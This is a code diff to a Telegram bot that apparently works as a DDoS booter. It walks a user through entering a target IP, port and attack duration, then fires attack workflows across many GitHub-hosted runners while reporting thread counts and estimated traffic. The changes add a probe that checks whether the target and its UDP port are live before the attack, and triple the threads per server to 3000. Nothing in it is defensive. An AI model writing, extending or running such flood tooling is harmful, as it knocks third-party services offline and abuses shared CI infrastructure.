@@ -5,7 +5,7 @@ from config import OWNER_ID, WORKFLOW_COUNT
 from database import is_active, is_admin, add_attack, add_log
 from keyboards import attack_confirm, method_select, stop_confirm, main_menu
 from services.github import launch_all, get_all_runs, test_connection
-from utils.validators import valid_ip, valid_port, valid_duration
+from utils.validators import valid_ip, valid_port, valid_duration, check_ip_alive, check_udp_port
 import state
 import time
 import asyncio
@@ -21,8 +21,8 @@ def register(app):
         state.attack_state[user_id] = {"step": "ip"}
         await cb.message.edit_text(
             "**📝 Send target IP address:**\n\n"
-            "**Example:** `1.1.1.1`\n\n"
-            "**Send /cancel to cancel**"
+            "Example: `1.1.1.1`\n\n"
+            "/cancel to cancel"
         )
 
     @app.on_message(filters.private & filters.text &
@@ -47,6 +47,7 @@ def register(app):
                 f"**📝 Send target PORT:**\n"
                 f"Example: `80` or `443`"
             )
+
         if step == "port":
             if not valid_port(text):
                 return await message.reply("❌ **Invalid port** (1-65535), try again:")
@@ -57,13 +58,50 @@ def register(app):
                 f"**⏰ Send duration (seconds):**\n"
                 f"Example: `300` | Max: `21000`"
             )
+
         if step == "duration":
             if not valid_duration(text):
                 return await message.reply("❌ **Invalid** (1-21000), try again:")
             s["duration"] = int(text)
+            s["step"] = "checking"
+
+            # ===== TARGET LIVE CHECK =====
+            checking_msg = await message.reply(
+                f"**🔍 Checking target...**\n"
+                f"**🌐** `{s['ip']}:{s['port']}`\n\n"
+                f"⏳ Please wait..."
+            )
+
+            loop = asyncio.get_event_loop()
+            ip_alive   = await loop.run_in_executor(None, check_ip_alive, s["ip"])
+            udp_status = await loop.run_in_executor(None, check_udp_port, s["ip"], s["port"])
+
+            # IP status
+            if ip_alive is True:
+                ip_icon = "🟢 Live"
+            elif ip_alive is False:
+                ip_icon = "🔴 Unreachable (may have ICMP blocked)"
+            else:
+                ip_icon = "⚪ Check failed"
+
+            # UDP port status
+            if udp_status == "open":
+                udp_icon = "🟢 Open — service responding"
+            elif udp_status == "open_or_filtered":
+                udp_icon = "🟡 Open / Filtered — no ICMP reject"
+            elif udp_status == "closed":
+                udp_icon = "🔴 Closed — ICMP unreachable received"
+            else:
+                udp_icon = "⚪ Unknown"
+
             s["step"] = "method"
-            return await message.reply(
+            await checking_msg.edit_text(
                 f"**✅ Duration:** `{text}s`\n\n"
+                f"**🔍 TARGET STATUS**\n"
+                f"━━━━━━━━━━━━━━━━━━━━━\n"
+                f"**🌐 IP:** `{s['ip']}` → {ip_icon}\n"
+                f"**🔌 UDP:{s['port']}** → {udp_icon}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                 f"**⚡ Select attack method:**",
                 reply_markup=method_select()
             )
@@ -85,8 +123,8 @@ def register(app):
             f"**⏰ Duration:** `{s['duration']}s`\n"
             f"**⚡ Method:** `{s['method']}`\n"
             f"**🖥️ Servers:** `{WORKFLOW_COUNT}`\n"
-            f"**🧵 Threads/Server:** `1000`\n"
-            f"**📊 Total Threads:** `{WORKFLOW_COUNT * 1000:,}`\n\n"
+            f"**🧵 Threads/Server:** `3,000`\n"
+            f"**📊 Total Threads:** `{WORKFLOW_COUNT * 3000:,}`\n\n"
             f"**⚠️ Ready to launch?**",
             reply_markup=attack_confirm()
         )
@@ -113,8 +151,8 @@ def register(app):
             f"**🎯 Target:** `{s['ip']}:{s['port']}`"
         )
 
-        threads = 1000
-        count = launch_all(s["ip"], s["port"], threads, s["duration"])
+        threads = 3000
+        count   = launch_all(s["ip"], s["port"], threads, s["duration"])
 
         if count == 0:
             add_log("attack_failed", user_id, "No workflows triggered")
@@ -123,66 +161,59 @@ def register(app):
                 reply_markup=main_menu(is_admin=is_admin(user_id), is_owner=user_id == OWNER_ID)
             )
 
-        # Save to state immediately
-        attack_id = f"atk_{user_id}_{int(time.time())}"
+        attack_id  = f"atk_{user_id}_{int(time.time())}"
+        started_ts = time.time()
+
         state.current_target = {
-            "ip": s["ip"],
-            "port": s["port"],
-            "threads": threads,
-            "duration": s["duration"],
-            "started_at": time.time()
+            "ip":         s["ip"],
+            "port":       s["port"],
+            "threads":    threads,
+            "duration":   s["duration"],
+            "started_at": started_ts
         }
         state.watchdog_enabled = True
 
         add_attack(attack_id, {
-            "user_id": user_id,
-            "ip": s["ip"],
-            "port": s["port"],
-            "duration": s["duration"],
-            "method": s["method"],
-            "servers": count,
+            "user_id":           user_id,
+            "ip":                s["ip"],
+            "port":              s["port"],
+            "duration":          s["duration"],
+            "method":            s["method"],
+            "servers":           count,
             "threads_per_server": threads,
-            "total_threads": count * threads,
-            "started_at": datetime.now().isoformat(),
-            "status": "running"
+            "total_threads":     count * threads,
+            "started_at":        datetime.now().isoformat(),
+            "status":            "running"
         })
         add_log("attack_started", user_id, f"{s['ip']}:{s['port']}")
 
-        # Live status loop - 5 second intervals, 3 updates
-        started_at = time.time()
+        # Live status — 3 updates × 5s
         for check in range(3):
             await asyncio.sleep(5)
-            runs = get_all_runs()
-            running = sum(
-                1 for wf, st in runs.items()
-                if wf.startswith("bot") and st in ["in_progress", "queued"]
-            )
-            queued = sum(
-                1 for wf, st in runs.items()
-                if wf.startswith("bot") and st == "queued"
-            )
-            active = running - queued
-            elapsed = int(time.time() - started_at)
-
-            # Estimated traffic
-            est_pkt_per_sec = active * threads * 8  # rough estimate
-            est_mbps = (est_pkt_per_sec * 65507 * 8) / 1_000_000
+            runs    = get_all_runs()
+            running = sum(1 for wf, st in runs.items()
+                          if wf.startswith("bot") and st in ["in_progress", "queued"])
+            queued  = sum(1 for wf, st in runs.items()
+                          if wf.startswith("bot") and st == "queued")
+            active  = running - queued
+            elapsed = int(time.time() - started_ts)
+            est_mbps = active * threads * 65507 * 8 / (1024**2) * 0.01
 
             await msg.edit_text(
-                f"**🎯 ATTACK STATUS — Live**\n"
+                f"**🎯 ATTACK LIVE**\n"
                 f"━━━━━━━━━━━━━━━━━━━━━\n"
                 f"**🆔 ID:** `{attack_id}`\n"
                 f"**🌐 Target:** `{s['ip']}:{s['port']}`\n"
                 f"**⚡ Method:** `{s['method']}`\n"
                 f"**⏰ Duration:** `{s['duration']}s`\n"
                 f"━━━━━━━━━━━━━━━━━━━━━\n"
-                f"**🖥️ Triggered:** `{count}/{WORKFLOW_COUNT}` servers\n"
-                f"**▶️ Active:** `{active}` | **⏳ Queued:** `{queued}`\n"
-                f"**🧵 Threads:** `{active * threads:,}` active\n"
-                f"**📊 Est. Traffic:** `~{est_mbps:.0f} Mbps`\n"
+                f"**🖥️ Triggered:** `{count}/{WORKFLOW_COUNT}`\n"
+                f"**▶️ Active:** `{active}` | **⏳ Queue:** `{queued}`\n"
+                f"**🧵 Threads:** `{active * threads:,}`\n"
+                f"**📊 Est.:** `~{est_mbps:.0f} Mbps`\n"
                 f"**⏱️ Elapsed:** `{elapsed}s`\n"
                 f"━━━━━━━━━━━━━━━━━━━━━\n"
-                f"{'🟢 ATTACK RUNNING' if running > 0 else '🔴 STARTING...'}",
+                f"{'🟢 RUNNING' if running > 0 else '🟡 STARTING...'}",
                 reply_markup=stop_confirm()
             )
 
@@ -190,7 +221,7 @@ def register(app):
     async def cancel_attack(client, cb: CallbackQuery):
         state.attack_state.pop(cb.from_user.id, None)
         await cb.message.edit_text(
-            "❌ **Attack cancelled.**",
+            "❌ **Cancelled.**",
             reply_markup=main_menu(
                 is_admin=is_admin(cb.from_user.id),
                 is_owner=cb.from_user.id == OWNER_ID
